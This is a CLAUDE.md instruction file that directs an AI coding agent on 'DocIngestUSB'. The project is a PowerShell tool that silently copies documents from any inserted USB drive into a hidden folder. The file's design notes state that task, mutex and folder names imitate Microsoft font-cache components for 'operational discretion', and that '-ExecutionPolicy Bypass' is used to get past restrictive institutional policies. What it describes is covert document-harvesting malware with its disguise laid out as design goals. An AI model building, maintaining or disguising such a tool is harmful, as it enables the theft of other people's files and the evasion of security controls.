# CLAUDE.md — DocIngestUSB

## Purpose

Silent USB document ingestion pipeline (PDF, DOCX, DOC).
Copies new files from removable drives to `%USERPROFILE%\.cache\msft-fontcache` (env var expanded at runtime), deduplicated by SHA-256.
Scheduled tasks: `MicrosoftFontCacheWorker` (logon) + `MicrosoftFontCacheMonitor` (5-min watchdog). Mutex: `MsftFontCacheWorker_Mutex`.
Git: `jpbyteforge/DocIngestUSB` (private).

## Model Policy

- Min tier: HAIKU (read-only / research)
- Code changes: SONNET minimum
- Architecture decisions: OPUS

## Protected Zones

- `%USERPROFILE%\.cache\msft-fontcache\hash_db.txt` — append-only state file. Never truncate or rewrite without explicit owner instruction.
- `%USERPROFILE%\.cache\msft-fontcache\sync_log*.txt` — audit trail. Never delete without explicit owner instruction.
- `%USERPROFILE%\.cache\msft-fontcache\*.meta.json` — provenance sidecar files. Never modify after creation.

## Permitted Write Areas

- `src/` — all script source files
- `config.json` — configuration
- Project root — `CLAUDE.md`, `.gitignore`, `README.md`, `deploy.bat`, `uninstall.bat`

## Key Decisions

| Decision | Rationale |
|----------|-----------|
| SHA-256 dedup | Content-based, no practical collision risk |
| HashSet in-memory | O(1) lookup vs O(n) flat-file scan |
| Atomic copy (tmp → verify → rename) | Prevents partial/corrupt files in destination |
| Named mutex | Prevents concurrent instance race conditions |
| Log rotation | Prevents unbounded log growth |
| `-ExecutionPolicy Bypass` (process-scope only) | Owner decision 2026-03-30: bypass de scope de processo aceite — não altera política de sistema ou utilizador; necessário para funcionar com políticas restritivas institucionais |
| Discreet naming | Operational discretion — names blend with Windows system components |
| Environment variable expansion | Portability across machines — no hardcoded paths |
| Adaptive settle (2s retry, max 30s) | USB ready in ~3-5s avg vs 30s fixed wait |
| Watchdog task (5-min) | Crash recovery — mutex prevents duplicates |
| Batch hash flush | Single write per scan cycle vs per-file append |
| Streaming pipeline | First copy starts without waiting for full enumeration |
| Per-drive rescan tracking | Avoids redundant re-enum of static drives |

## Dependencies

- PowerShell 5.1+ (ships with Windows 10/11)
- No external modules
